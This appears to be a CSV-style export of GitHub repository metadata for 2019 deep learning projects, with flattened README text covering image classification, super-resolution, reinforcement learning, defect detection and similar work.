KevinThelly,OpenCV-and-Deep-Learning,convolutional-neural-networks#deep-learning#opencv#opencv-python,OpenCV and Deep Learning basics to OpenCV Deep Learning implementation,2019-06-27T11:02:18Z,2019-07-02T18:06:38Z,Jupyter Notebook,KevinThelly,User,1,1,0,34,master,KevinThelly,1,0,0,0,0,0,0
Vinay352,Deep-Learning-Dogs-and-Cats,n/a,Deep Learning Dogs and Cats This is a deep learning program that is trained to differentiate between dogs and cats 10000 images were used in total 4000 images of each cats and dogs were used to train the CNN network 1000 images of each cats and dogs were used to test the CNN network The accuracy of this python program is 85 1 The images were augmented to different scale sizes etc to produce more images for the neural network to train and test,2019-07-02T12:32:13Z,2019-07-03T04:55:24Z,Python,Vinay352,User,0,1,0,4,master,Vinay352,1,0,0,0,0,0,0
ivan-vasilev,advanced-deep-learning-with-python,n/a,Advanced Deep Learning with Python This is the code repository for the book Advanced Deep Learning with Python https www amazon com Advanced Deep Learning Python next generation ebook dp B082DHGVT5 published by Packt Cover https www packtpub com media catalog product cache ecd051e9670bd57df35c8f0b122d8aea 9 7 9781789956177 original png Table of contents 1 The Nuts and Bolts of Neural Networks 2 Understanding Convolutional Networks 3 Advanced Convolutional Networks 4 Object Detection and Image Segmentation 5 Generative Models 6 Language Modeling 7 Understanding Recurrent Networks 8 Sequence to Sequence Models and Attention 9 Emerging Neural Network Designs 10 Meta Learning 11 Deep Learning for Autonomous Vehicles All code examples were tested against TensorFlow 2 0 0 and PyTorch 1 3 1 Some of the code example are adapted from other open source code repositories In such cases the base example is linked at the beginning of the code file,2019-07-07T19:14:57Z,2019-12-12T08:43:07Z,Jupyter Notebook,ivan-vasilev,User,1,1,0,49,master,ivan-vasilev,1,0,0,0,0,0,0
Shijie97,my-deep-learning-from-scratch,n/a,my deep learning from scratch,2019-07-30T13:02:52Z,2019-08-29T05:35:30Z,Python,Shijie97,User,1,1,0,6,master,Shijie97,1,0,0,0,0,0,0
FarmerCui,NeuralNetworksAndDeepLearning,n/a,NeuralNetworksAndDeepLearning,2019-08-06T15:03:20Z,2019-08-06T15:52:36Z,Jupyter Notebook,FarmerCui,User,1,1,0,2,master,FarmerCui,1,0,0,0,0,0,0
systemcontroling,AI,n/a,,2019-07-08T03:07:22Z,2019-10-28T16:07:14Z,n/a,systemcontroling,User,0,1,0,0,master,,0,0,0,0,0,0,0
Liu-1994,RadioML,n/a,RadioML deep learning for AMR The code for Data Driven Deep Learning for Automatic Modulation Recognition in Cognitive Radios https ieeexplore ieee org document 8645696 https ieeexplore ieee org document 8645696 Keras with TensorFlow backend trian py The code for training eval py The code for evaluating and predicting models py The structure of the models preprocessing py The code for reading data from mat postprocessing py The code for ploting confusion matrix,2019-07-29T02:14:22Z,2019-11-21T07:08:35Z,Python,Liu-1994,User,1,1,1,11,master,Liu-1994,1,0,2,1,0,0,0
stormcolor,fpga-brain,deep-learning#fpga#robotics,fpga brain Robot using Cyclone IV E VGA MPU 9265 SDRAM NEURAL NETWORK,2019-07-27T22:59:50Z,2019-10-03T03:51:42Z,VHDL,stormcolor,Organization,1,1,1,89,master,3DRoberto,1,0,1,0,1,0,0
venkatroch31,Credit-Card-Fraud-Detection,n/a,Credit Card Fraud Detection,2019-06-24T16:29:24Z,2019-11-06T12:06:41Z,Jupyter Notebook,venkatroch31,User,0,1,0,8,gh-pages,venkatroch31,1,0,0,0,0,0,0
Raehyun2,Project_Flower,n/a,,2019-08-05T06:48:28Z,2019-08-09T05:55:05Z,Python,Raehyun2,User,1,1,0,1,master,Raehyun2,1,0,0,0,0,0,0
wuuw,NN-models,n/a,,2019-07-09T07:14:12Z,2019-08-05T07:15:28Z,Python,wuuw,User,0,1,0,9,master,wuuw,1,0,0,0,0,0,0
thetechwhiz,Differential-Privacy,n/a,Privacy using deep learning Some projects using different privacy methods,2019-07-01T13:20:51Z,2019-08-15T14:20:10Z,Jupyter Notebook,thetechwhiz,User,0,1,0,18,master,thetechwhiz,1,0,0,1,0,1,3
ianrowan,DeepWave,artificial-intelligence#bert#deep-learning#gpt-2#machine-learning#openai#signal-processing#tensorflow,DeepWave A Deep Learning Approach leveraging Transformer style Architectures for signal classification DeepWave is a experimental Deep learning framework which utilizes recently developed Transformer based network architectures such as OpenAI GPT 2 https github com openai gpt 2 and the BERT https github com google research bert network to create a new angle to classify spectrogram based signals Due to the time series based nature of singal analysis and vector based sequence indices of the time x frequency based spectrogram an opportunity to utilize large and highly researched NLP based networks was apparant DeepWave adapts the NLP transformer networks which utilize the convept of attention to provide a robust network infrastructure to classify signals Intial research is being conducted using th RadioML https www deepsig io datasets dataset which includes 220 000 artificially generated Radio Wave modulations with labels for their types This dataset has been used as a Benchmark for many signal processing apporaches which will provide a baseline for DeepWave benchmarking Stay tuned for more,2019-08-03T16:12:23Z,2019-12-05T15:19:06Z,Python,ianrowan,User,1,1,0,8,master,ianrowan,1,0,0,0,0,0,0
Zeyuzhao,DeepKidney,n/a,DeepKidney A geometric deep learning approach to the kidney exchange matching problem Background Installation Usage Credits License,2019-07-06T02:55:32Z,2019-10-21T00:56:37Z,Jupyter Notebook,Zeyuzhao,User,1,1,0,29,master,Zeyuzhao,1,0,0,0,0,0,0
codehack9991,DeepFakes,n/a,DeepFakes Generate fakes swapping faces in images and videos using deep learning,2019-07-21T19:58:04Z,2019-07-21T19:58:12Z,n/a,codehack9991,User,0,1,0,1,master,codehack9991,1,0,0,0,0,0,0
aaroha33,House-Sales-in-King-Country--ML-project,n/a,Data science Challenge Predict the sales of houses in King County with an accuracy of at least 75 80 and understand which factors are responsible for higher property value 650K and above,2019-07-24T14:53:26Z,2019-11-14T13:59:21Z,Jupyter Notebook,aaroha33,User,1,1,0,6,master,aaroha33,1,0,0,0,0,0,0
gauravchopracg,deep_dream,n/a,deepdream The code uses the Tensorflow Machine Learning library to generate a trippy image from a given input image Dependencies numpy http www numpy org functools PIL http stackoverflow com questions 20060096 installing pil with pip tensorflow https www tensorflow org versions r0 10 getstarted ossetup html pip installation matplotlib http matplotlib org 1 5 1 users installing html urllib https pypi python org pypi urllib3 os zipfile Install missing dependencies using pip https pip pypa io en stable installing Usage Once you have your dependencies installed via pip run the demo script in terminal via python deepdream py Credits Deep Dream Challenge code by SIrajology on Youtube https youtu be MrBzgvUNr4w,2019-07-14T06:02:33Z,2019-10-22T15:21:32Z,Python,gauravchopracg,User,0,1,0,3,master,gauravchopracg,1,0,0,0,0,0,0
richardt94,deepSAR,n/a,deepSAR Deep learning for removing speckle noise from synthetic aperture radar SAR images Dependencies Python 3 7 Tensorflow r1 14 Scripts trainandtest py Trains the model on the modified UC Merced Land Use dataset adding synthetic speckle to the input images testandsave py Runs the model on the validation portion of the UC Merced dataset Saves the synthetic noisy input and the results as png images Yet to be implemented Workflow to test the model on real noisy SAR images obtained from a datacube https www opendatacube org specifically Digital Earth Australia,2019-07-17T07:29:58Z,2019-10-07T12:18:24Z,Python,richardt94,User,0,1,1,7,master,richardt94,1,0,0,1,0,0,0
brainvisa,morpho-deepsulci,n/a,,2019-07-17T12:49:15Z,2019-10-09T10:26:26Z,Python,brainvisa,Organization,2,1,0,52,master,LeonieBorne#denisri#ylep,3,0,0,0,0,0,1
devesh1301,Machine-learning-and-Deep-Learning-0-to-1,n/a,Solution of machine learning problem for beginners This repo consist of file which will allow beginners to start their journey with machine learning Titanic kaggle solution is also there Checkout my Repo ML project Compared different model for mnist data set Neural network for mnist data set is there Date prediction is for predicting date where directly you can t apply any algorithm directly You have to change date format and then apply your model Thanks For your supports Devesh if you have any problem contact me deveshpandey142 gmail com,2019-07-08T08:16:24Z,2019-07-08T09:23:08Z,Jupyter Notebook,devesh1301,User,0,1,0,4,master,devesh1301,1,0,0,0,0,0,0
psteinb,adversarial-medical-imaging-test-code,adversarial#adversarial-examples#deep#deep-learning#learning#medical-imaging#slides,adversarial medical imaging imbdd slidedeck and resources for my talk on adversarial examples in medical imaging,2019-07-04T09:37:58Z,2019-12-04T06:08:07Z,Jupyter Notebook,psteinb,User,0,1,0,0,master,,0,0,0,0,0,0,0
htemiz,DeepSR_prev,n/a,A Python Framework for Obtaining and Automating Super Resolution with Deep Learning Algorithms DOI https zenodo org badge 198432258 svg https zenodo org badge latestdoi 198432258 DeepSR is an open source progam that eases the entire processes of the Super Resolution SR problem in terms of Deep Learning DL algorithms DeepSR makes it very simple to design and build DL models Thus it empowers researchers to focus on their studies by saving them from struggling with time consuming and challenging workloads while pursuing successful DL algorithms for the task of SR Each step in the workflow of SR pipeline such as pre processing augmentation normalization training post processing and test are governed by this framework in such a simple easy and efficient way that there would remain at most very small amount of work for researchers to accomplish their experiments In this way DeepSR ensures a way of fast prototyping and providing a basis for researchers and or developers eliminating the need of commencing whole job from the scratch or the need of adapting existing program s to new designs and implementations DeepSR is designed in such a way that one can interact with it from the command prompt or use it as class object by importing it into another program It is mainly tailored for using it with scripts from command prompt by providing many ready to use functionalities at hand Hence multiple tasks experiments can be performed successively by using batch scripts However addition to command prompt interface it is ready also to do the same tasks by calling it as a class object from another Python program Addition to this one can develop his her own programs or can write Python scripts performing subject specific tasks at his her disposal Even more he she can add new features to the program to contribute this effort for making it better In order to construct DL models DeepSR utilizes Kears https www keras io Keras is capable of running on top of the following prominent DL frameworks TensorFlow https www tensorflow org Theano http deeplearning net software theano and CNTK https github com microsoft CNTK It transforms DL models designed by coding with its API into the models of these frameworks Thus this program is capable of running models on both CPUs or GPUs seamlessly by leveraging these frameworks Installation In order to install the DeepSR issue the following command in command prompt python m pip install DeepSR The downloadable binaries and source code are available at PyPI repository in the following address https pypi org project DeepSR How to Use It DeepSR fundamentally consists of three Python files DeepSR py args py and utils py The DeepSR object is declared in the file DeepSR py It is the core python module called first for running the program All parameters that can be used with DeepSR in command prompt are defined in the file args py The module utils py accompanies many tools making the life easier and maintaining the reusability All needs to be done is to build up a DL model using the API of Keras within a model file a python file and then provide the program the relevant information and or instructions A Model file is an ordinary Python file a py must have at least two things within itself A dictionary named settings This dictionary is used to supply the DeepSR with all necessary settings and or instructions to perform tasks A method named buildmodel This method preserves the definition of the model in Keras API and returns it the composed version of it By this way DeepSR intakes deep learning models either from command prompt or whereas it is used as an class object Please refer to the Section 3 in the program manual for further information about model files To see a sample model file locate the samples folder within DeepSR folder This dictionary is used to provide the program all necessary settings and or instructions to do intended tasks Settings are given in the dictionary in a key value pairs All keys are summarized in the manual DeepSR docs DeepSR 32Manual 32v1 0 0 pdf The keys correspond to command arguments in command prompt One can easily construct and set his her models with parameters by providing key value pairs in this dictionary to perform Super Resolution task with Deep Learning methods However the same settings can also be given to the program as arguments in command prompt Please note that although settings were designated in the dictionary the same settings provided as arguments in command prompt override them Thus the program ignores the values instructions of those settings designated in the dictionary and uses the ones given as command arguments The alteration of the settings is valid only for the class object not valid for model files Namely settings are not changed in the dictionary within the model files Model files will remain intact Interacting with Command Prompt The following code snippet is a sample for the use of the program from command line This code instructs the DeepSR to start training the model given returned from buildmodel function in the file samplemodel1 py with the parameters given in the dictionary settings within the same file If you check the model file for example you will notice that training will to be performed for 10 epoch scale is 4 learning rate is 0 001 and so on The test results scores of image quality measures used in test procedure obtained from each test images are saved in an Excel file with the average scores of measures over test set python DeepSR py modelfile samplemodel1 py train Please note that it is assumed that the location of the DeepSR py file has already set to the system s PATH To perform the test for the evaluation of the model s performance on given test set of images by a number of image quality measures add test argument to above code python DeepSR py modelfile samplemodel1 py train test The following code augments images with 90 180 270 degree of rotations and applies Min Max normalization 0 1 before they were given to the model for training procedure After training test is going to be applied also python DeepSR py modelfile samplemodel1 py train augment 90 180 270 test normalization minmax Below another model file you can locate this file under samples folder is used to perform the test for a trained model by saving the outputs images of each layers in image files python DeepSR py modelfile samplemodel2 py test layeroutputs saveimages More detailed examples and explanation are given in the program manual Using DeepSR as Class Object DeepSR can be used as a Python object from another program as well The key point here is that all parameters along with settings must be assigned to the object before doing any operation with it User need to designate each parameter instruction as class member or methods by manually On the other hand there is another way of doing this procedure DeepSR object takes only one parameter in class construction phase for setting it up with parameters args arguments or setting in another word The argument args must be a dictionary with key value pairs similar to the dictionary settings in model files The parameters instructions in args can be taken from a file programmatically or can be written in actual python code where the actual program is being coded It is up to the user DeepSR can be constructed without providing any settings in args The class will have no any members or methods in such case This user is informed about this situation in command prompt However each parameter of the program and also build method must still be designated in the class as members before they are being used for any operations The following code snippet is an example for creating DeepSR object from Python scripts by assigning settings to class in construction stage of the class python import DeepSR from os path import basename settings augment 90 180 can be any combination of 90 180 270 flipud fliplr flipudlr or backend theano keras is going to use theano framework in processing batchsize 9 number of batches channels 1 color channels to be used in training Only one channel in this case colormode YCbCr the color space is YCbCr YCbCr or RGB crop 0 do not crop from borders of images croptest 0 do not crop from borders of images in tests decay 1e 6 learning rate decay earlystoppingpatience 5 stop after 5 epochs if the performance of the model has not improved epoch 2 train the model for total 10 passes on training data inputsize 33 size of input image patches is 33x33 lrate 0 001 lrateplateaupatience 3 number of epochs to wait before reducing the learning rate lrateplateaufactor 0 5 the ratio of decrease in learning rate value minimumlrate 1e 7 learning rate can be reduced down to a maximum of this value modelname basename file split 0 modelname is the same as the name of this file metrics PSNR SSIM the model name is the same as the name of this file normalization standard 53 28 40 732 apply standardization to input images mean std outputdir sub directories automatically created scale 4 magnification factor is 4 stride 11 give a step of 11 pixels apart between patches while cropping them from images for training targetchannels 1 color channels to be used in tests Only one channel in this case targetcmode RGB YCbCr or RGB testpath r D testimages path to the folder in which test images are Can be more than one traindir r D trainingimages path to the folder in which training images are upscaleimage False The model is going to upscale the given low resolution image valdir r path to the folder in which validation images are workingdir r path to the working directory All outputs to be produced within this directory weightpath path to model weights either for training to start with or for test DSR DeepSR DeepSR settings instance of DeepSR object without the buildmodel method At this point DeepSR object was created with parameters but without the method buildmodel Therefore this method must be declared in the class object in order to compose a deep learning model User can write this method in the same script and assign it to the class by calling the member method of the DeepSR object setmodel In the following code snippet a sample method for constructing a deep learning model defined and assigned to DeepSR object by the member method python from keras import losses from keras layers import Input from keras layers convolutional import Conv2D UpSampling2D from keras models import Model from keras optimizers import Adam a method returning an autoencoder model def buildmodel self testmode False if testmode inputsize None else inputsize self inputsize encoder inputimg Input shape inputsize inputsize self channels x Conv2D 32 3 3 activation relu padding same inputimg x Conv2D 16 1 1 activation relu padding same x x Conv2D 8 3 3 activation relu padding same x x Conv2D 3 1 1 activation relu padding same x decoder x UpSampling2D self scale self scale x upscale by the scale factor x Conv2D 8 3 3 activation relu padding same x x Conv2D 16 1 1 activation relu padding same x x Conv2D 32 3 3 activation relu padding same x decoded Conv2D self channels 3 3 activation relu padding same x autoencoder Model inputimg decoded autoencoder compile Adam self lrate self decay loss losses meansquarederror return autoencoder Now the class object is ready for further processes A training and test procedure is being implemented below python DSR setmodel buildmodel set buildmodel function to compose a DL model in the class DSR epoch 1 training will be implemented for 1 time instead of 10 as defined in settings DSR train training procedure the performance of the model is evaluated below DSR test testpath DSR testpath weightpath DSR weightpath saveimages False plot False To wrap all together whole code is below python import DeepSR from os path import basename settings augment 90 180 can be any combination of 90 180 270 flipud fliplr flipudlr or backend theano keras is going to use theano framework in processing batchsize 9 number of batches channels 1 color channels to be used in training Only one channel in this case colormode YCbCr the color space is YCbCr YCbCr or RGB crop 0 do not crop from borders of images croptest 0 do not crop from borders of images in tests decay 1e 6 learning rate decay earlystoppingpatience 5 stop after 5 epochs if the performance of the model has not improved epoch 2 train the model for total 10 passes on training data inputsize 33 size of input image patches is 33x33 lrate 0 001 lrateplateaupatience 3 number of epochs to wait before reducing the learning rate lrateplateaufactor 0 5 the ratio of decrease in learning rate value minimumlrate 1e 7 learning rate can be reduced down to a maximum of this value modelname basename file split 0 modelname is the same as the name of this file metrics PSNR SSIM the model name is the same as the name of this file normalization standard 53 28 40 732 apply standardization to input images mean std outputdir sub directories automatically created scale 4 magnification factor is 4 stride 11 give a step of 11 pixels apart between patches while cropping them from images for training targetchannels 1 color channels to be used in tests Only one channel in this case targetcmode RGB YCbCr or RGB testpath r D testimages path to the folder in which test images are Can be more than one traindir r D trainingimages path to the folder in which training images are upscaleimage False The model is going to upscale the given low resolution image valdir r path to the folder in which validation images are workingdir r path to the working directory All outputs to be produced within this directory weightpath path to model weights either for training to start with or for test DSR DeepSR DeepSR settings instance of DeepSR object without the buildmodel method from keras import losses from keras layers import Input from keras layers convolutional import Conv2D UpSampling2D from keras models import Model from keras optimizers import Adam a method returning an autoencoder model def buildmodel self testmode False if testmode inputsize None else inputsize self inputsize encoder inputimg Input shape inputsize inputsize self channels x Conv2D 32 3 3 activation relu padding same inputimg x Conv2D 16 1 1 activation relu padding same x x Conv2D 8 3 3 activation relu padding same x x Conv2D 3 1 1 activation relu padding same x decoder x UpSampling2D self scale self scale x upscale by the scale factor x Conv2D 8 3 3 activation relu padding same x x Conv2D 16 1 1 activation relu padding same x x Conv2D 32 3 3 activation relu padding same x decoded Conv2D self channels 3 3 activation relu padding same x autoencoder Model inputimg decoded autoencoder compile Adam self lrate self decay loss losses meansquarederror return autoencoder DSR setmodel buildmodel set buildmodel function to compose a DL model in the class DSR epoch 1 model shall be trained only for 1 epoch instead of 10 as defined in settings DSR train training procedure evaluate the performanc,2019-07-23T13:05:40Z,2019-11-16T09:48:01Z,Python,htemiz,User,0,1,0,128,master,htemiz,1,1,2,0,0,0,0
reallygooday,AWS-DeepRacer-Scholarship,n/a,AWS DeepRacer Scholarship August 2019 Training and deploying autonomous racer with reinforcement learning and AWS platform Link https console aws amazon com deepracer home region us east 1 welcome Nanodegree scholarships will be provided to students with the best racing scores in the August September and October AWS DeepRacer races as well as to students who record the highest total point scores across all 3 months AWS DeepRacer is 1 18th scale racing car built on reinforcement learning The Basic of reinforcement learning includes agents actions enviroments states and rewards Agent the entity exhibiting certain behaviors actions based on its environment In our case its our AWS DeepRacer car Actions what the agent chooses to do at certain places in the environment such as turning going straight going backward etc Actions can be discrete or continuous States has to do with where in the environment the agent resides at a specific location or with what is going on in the environment for a robotic vacuum perhaps that its current location is also clean By taking actions the agent moves from one state to a new state States can be partial or absolute Absolute vs partial states are different based on whether the agent can see the whole environment As reinforcement learning models interact with an environment actions are rewarded or punished based on consequences from previous iterations In reinforcement learning theres an agent that takes an action based on its environment Actions cause the environment to change to a new state which may or may not yield points for the model AWS DeepRacer models learn which actions are ideal to take in the environment given a particular state which yields rewards x Lesson Reinforcement Learning x Lesson Tuning Your Model Machine Learning Algorithms Supervised learning trains a model based on providing labels to each input such as classifying between images of a bulldog and those that are not a bulldog Unsupervised learning can use techniques like clustering to find relationships between different points of data such as in detecting new types of fraud Reinforcement learning uses feedback from previous iterations using trial and error to improve performance,2019-08-03T13:06:09Z,2019-08-03T13:36:15Z,n/a,reallygooday,User,1,1,0,7,master,reallygooday,1,0,0,0,0,0,0
sgjheywa,DeepRL-for-Trading,n/a,,2019-07-04T14:09:23Z,2019-07-05T14:18:18Z,Python,sgjheywa,User,0,1,0,1,master,sgjheywa,1,0,0,0,0,0,0
kirarpit,klotski-deep-RL,n/a,,2019-07-27T04:31:20Z,2019-11-14T16:54:09Z,Python,kirarpit,User,1,1,0,14,master,kirarpit,1,0,0,0,0,0,0
daxiaHuang,Deep-Learning-Approach-for-Surface-Defect-Detection,n/a,Deep Learning Approach for Surface Defect Detection A Tensorflow implementation of Segmentation Based Deep Learning Approach for Surface Defect Detection DeepLabV3 Unet The author submitted the paper to Journal of Intelligent Manufacturing https link springer com article 10 1007 s10845 019 01476 x where it was published In May 2019 The test environment python 3 6 cuda 9 0 cudnn 7 1 4 Tensorflow 1 12 You should know I used the Dataset used in the papar you can download KolektorSDD https www vicos si Downloads KolektorSDD here If you train you own datset you should change the dataset interfence for you dataset You can refer to the paper https link springer com article 10 1007 s10845 019 01476 x for details of the experiment my experimental results on KolektorSDD Notes the first 30 subfolders are used as training sets the remaining 20 for testing Although I did not strictly follow the params of the papar I still got a good result 2019 05 21 09 20 54 634 utils INFO total number of testing samples 160 2019 05 21 09 20 54 634 utils INFO positive 22 2019 05 21 09 20 54 634 utils INFO negative 138 2019 05 21 09 20 54 634 utils INFO TP 21 2019 05 21 09 20 54 634 utils INFO NP 0 2019 05 21 09 20 54 634 utils INFO TN 138 2019 05 21 09 20 54 635 utils INFO FN 1 2019 05 21 09 20 54 635 utils INFO accuracy 0 9938 2019 05 21 09 20 54 635 utils INFO prescision 1 0000 2019 05 21 09 20 54 635 utils INFO recall 0 9545 visualization kos49Part4 jpg visualization test kos48Part5 jpg testing the KolektorSDD After downloading the KolektorSDD and changing the param datadir python run py test Then you can find the result in the visulaiation test and Log txt training the KolektorSDD First only the segmentation network is independently trained then the weights for the segmentation network are frozen and only the decision network layers are trained training the segment network python run py trainsegment training the decision network python run py traindecision training the total network not good python run py traintotal,2019-07-23T05:40:21Z,2019-10-15T03:47:36Z,Python,daxiaHuang,User,0,1,0,31,master,Wslsdx,1,0,0,0,0,0,0
CaptainE,Deep-reinforcement-learning-A3C,a3c#advantage-estimator#berkeley-reinforcement-learning#cs-294#reinforcement-learning,Deep reinforcement learning A3C Repository containing material regarding a modified version of the Berkeley Deep reinforcement learning course that is it only contain some of the assignments for CS294 112 and a PyTorch implementation of Asynchronous Advantage Actor Critic A3C using Generalized Advantage Estimation as a project Here only solutions material for homework 1 4 and 5a is provided in Tensorflow The A3C algorithm is made possible by distributed learning in which numerous workers interact with the environment and update model parameters asynchronously hence the name This removes the need for a memory buffer as with other algorithms also the distributed learning allows for more efficient use of hardware as we can generate multiple rollouts running in parallel Since our rollouts are generated on policy there is a high chance that all trajectories end up being similar as action probabilities gradually become near zero for all but one action in the discrete case which ultimately limits exploration Thus we see another benefit of A3C as it addresses this problem by introducing an entropy term to the loss function which is discussed in section 2 We extend the A3C by replacing the advantage estimator used in Minh 2016 by the Generalized Advantage Estimate GAE as proposed by Schulman 2015 and evaluate the algorithm on a number of environments See our paper for more details The work presented in this repository is to be considered open source under the MIT License If you found this code useful in your research then please cite mischansen ebert title Distributed Deep Reinforcement Learning with Asynchronous Advantage Actor Critic using Generalized Advantage Estimation author Ebert Peter and Hansen Nicklas year 2019,2019-07-24T18:13:24Z,2019-10-10T18:46:42Z,Python,CaptainE,User,0,1,0,6,master,CaptainE,1,0,0,0,0,0,0
sgordon007,DL4Sci_notebooks,n/a,,2019-07-19T21:23:36Z,2019-11-18T07:18:59Z,Jupyter Notebook,sgordon007,User,0,1,0,2,master,sgordon007,1,0,0,0,0,0,0
ThirdEyeData,Deep-Learning-Notebooks-on-AzureML,n/a,Deep Learning Notebooks on AzureML This project contains Deep learning tutorials notebooks from the assignments of the DeepLearning ai courses in Coursera Prerequisites In order to run these notebooks in your local machine install anaconda https www anaconda com distribution which contains all the required packages required Anaconda is an open source distribution and is the easiest way to perform Python R data science and machine learning on Linux Windows and Mac OS X It is industry standard for developing testing ad training on a single machine There are also a few pre trained model which is required to run a few notebooks the download links for those files are mentioned below ResNet50 h5 https thirdeyebigdata my sharepoint com u g personal djdasonthirdeyecom EYfA1jaIu5xPsTQzj0CWBkBCAQH9R ssAL9SnAnzB0UQ e K33vZO yolo h5 https thirdeyebigdata my sharepoint com u g personal djdasonthirdeyecom EbS4VgLf HtPmi91QfZ4sB7LMq85uzHKzcaQEEEvCG5w e CGkQf5 imagenet vgg verydeep 19 mat https thirdeyebigdata my sharepoint com u g personal djdasonthirdeyecom EXcs66kOWtpFllRDQtT0WdYBS11x5dlt5LWoAQUNWSw e YCsHRU Installing Download the Anaconda Distribution from here https www anaconda com distribution and install in your local machine This would install all the required packages and jupyter notebook in your machine Running the notebooks in your local machine First git clone the project in your local machine directory Next download the the pre trained models from the link above and save them in the following path ResNet50 h5 Deep Learning Labs03 Convolutional Neural Networks13 Residual Networks yolo h5 Deep Learning Labs03 Convolutional Neural Networks14 Autonomous driving application Car detectionmodeldata imagenet vgg verydeep 19 mat Deep Learning Labs03 Convolutional Neural Networks16 Art Generation with Neural Style Transferpretrained model Windows If you are using a Windows OS 1 From the Start menu search for and open Anaconda Prompt 2 cd to the project directory 3 type jupyter notebook 4 Jupyter notebook open in your default browser 5 Using jupyter notebook naviagate to the tutorial folder you want to run 6 Open the notebook extension ipynb 7 Use the tutorials Linux If you are using a Linux OS 1 Open linux terminal window 2 cd to the project directory 3 type jupyter notebook 4 Jupyter notebook open in your default browser 5 Using jupyter notebook naviagate to the tutorial folder you want to run 6 Open the notebook extension ipynb 7 Use the tutorials Mac OS If you are using a Mac OS 1 Open Launchpad then click the terminal icon 2 cd to the project directory 3 type jupyter notebook 4 Jupyter notebook open in your default browser 5 Using jupyter notebook naviagate to the tutorial folder you want to run 6 Open the notebook extension ipynb 7 Use the tutorials,2019-07-01T17:52:37Z,2019-09-14T11:32:40Z,Jupyter Notebook,ThirdEyeData,Organization,2,1,0,10,master,manish-thirdeye#DjDas,2,0,0,0,0,0,0
JennEYoon,learn-mldl,n/a,My adventure in Python machine learning I am learning Python Machine Learning and Deep Learning My goal is to document my progress on a GitHub repo Author Jennifer E Yoon Main Classes Stanford CS231n Spring 2019 Convolutional Neural Networks for Visual Recognition http cs231n stanford edu http faculty marshall usc edu gareth james ISL Coursera org deeplearning ai class 1 Neural Networks https www coursera org learn neural networks deep learning specialization deep learning Coursera org deeplearning ai class 4 Convolutional Neural Networks https www coursera org learn convolutional neural networks specialization deep learning Coursera org Introduction to TensorFlow https www coursera org learn introduction tensorflow Udemy com Data Science and Machine Learning Bootcamp class Author code so your dollars will support the author rather than Udemy https www udemy com python for data science and machine learning bootcamp couponCode CURRENTPYDSML Main Books Jake VanderPlas Python Data Science Handbook c 2017 https github com jakevdp PythonDataScienceHandbook Francois Chollet Deep Learning with Python c 2018 https github com fchollet deep learning with python notebooks James Witten Hastie Tibshirani Introduction to Statistical Learning with R http faculty marshall usc edu gareth james ISL http faculty marshall usc edu gareth james ISL ISLR 20Seventh 20Printing pdf Folder structure will be either by topic or by class name I am also a member of a Meetup group in Sterling Virginia that are learning Stanford CS231n together https www meetup com Data Science Machine Learing Collaborative Learning Group Other Resource Bishop Pattern Recognition https www microsoft com en us research uploads prod 2006 01 Bishop Pattern Recognition and Machine Learning 2006 pdf Machine Learning with TensorFlow https www manning com books machine learning with tensorflow Goodfellow et al Deep Learning book http www deeplearningbook org http www deeplearningbook org exercises html Correcting My Errors Use a pull request to make corrections or to share additional information Typos and grammatical fixes are always welcome Supporting information on any of the topics are also welcome History Started on 7 17 2019 as a Github public repo Add folders for CS231n dlai deep learning ai Chollet DLPy book Vanderplas machine learning book,2019-07-18T14:12:45Z,2019-12-14T20:31:39Z,Jupyter Notebook,JennEYoon,User,0,1,1,609,master,JennEYoon,1,0,0,0,0,0,1
cheri01,deep-learning-from-scratch-for-Regression-Problem,n/a,Deep Learning Deep Learning ScikitLearnBostontrainneuralnet py GitHub https github com oreilly japan deep learning from scratch,2019-08-06T14:11:03Z,2019-12-14T13:44:50Z,Python,cheri01,User,1,1,0,5,master,cheri01,1,0,0,0,0,0,0
navneetkr123,Clustering-using-deep-learning-LSTM-Autoencoder-Kmeans-,n/a,Clustering using deep learning LSTM Autoencoder Kmeans This was a time series data of a machine,2019-06-28T10:04:03Z,2019-07-01T08:38:36Z,Jupyter Notebook,navneetkr123,User,0,1,0,3,master,navneetkr123,1,0,0,0,0,0,0
Langford-tang,University-Logo-Deep-Learning-Community-Detection,n/a,University Logo Deep Learning Community Detection About ourself Team members 1 Langford tang https github com Langford tang 2016 Southern University of Science and Technology 2 HUSTERGS https github com HUSTERGS 2017 Huazhong University of Science and Technology 3 JacinthGDRGN https github com JacinthGDRGN 2017 East China Normal University 4 zmw1216 https github com zmw1216 2017 Xi an Jiaotong University Team leader Langford tang https github com Langford tang About the project Basically we crawled most university logos from all over the world including 14 countries or cities and we feed the dataset into autoencoder neural network to get the high dimension representation of the logos so we can calculate the similarity among them and get the distance matrix And we firstly apply k means and do community detection within every cluster hoping to find something interesting and we actually did imgs result png part of our interesting findings for more detailed information please look into the poster Team Materials poster jpg and powerpoint Team Materials CD pptx we made If you like this project you can give us a star Front end shell cd Frontend python m http server open http 0 0 0 0 8000 http 0 0 0 0 8000 in your browser Frontend folder is no longer maintained please go to the Backend folder which integrate the front end Back end shell cd Backend sudo python server py open 0 0 0 0 in your browser you can change the port and host in server py if prefer not to run with root privilege still under develop data data200pixel all the data after manually select format crop resize Cleaned v2formatjpeg zip all the raw data after manually select and format src py related to neural network ipynb 1 Universityin crawl data using simulation browsing and Google Image Search Engine 2 SelectData ipynb Select data from the whole dataset to do algorithms comparison 3 China Sample 3d ipynb Apply community detection algorithms to the distance matrix generated from neural network and produce the json file to feed into the 3d force graph https github com vasturiano 3d force graph framework 4 mosaic ipynb this is just a by product generate mosaic picture with university logos we crawled using photomosaic https github com danielballan photomosaic python package from imgs iron man jpg to imgs iron man png,2019-07-16T09:14:07Z,2019-10-15T08:09:16Z,JavaScript,Langford-tang,User,1,1,1,54,master,HUSTERGS#Langford-tang#JacinthGDRGN#zmw1216,4,0,0,0,0,0,0
wuhuikai,DeepDrone,n/a,DeepDrone A python library for running image video processing computer vision and deep learning algorithms on Tello DJI drone,2019-07-10T13:54:49Z,2019-08-19T00:12:56Z,Python,wuhuikai,User,0,1,0,4,master,wuhuikai,1,0,0,0,0,0,0
